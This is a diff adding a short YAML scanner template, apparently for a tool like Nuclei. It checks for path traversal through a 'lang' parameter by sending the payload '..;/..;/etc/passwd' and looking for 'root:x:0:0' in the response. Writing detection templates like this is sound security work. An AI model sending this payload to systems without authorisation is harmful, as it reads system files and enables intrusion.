@@ -1,0 +1,20 @@
+id: lfi-048
+name: 'Path traversal via lang'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /etc/passwd via lang'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      lang:
+        - '..;/..;/etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
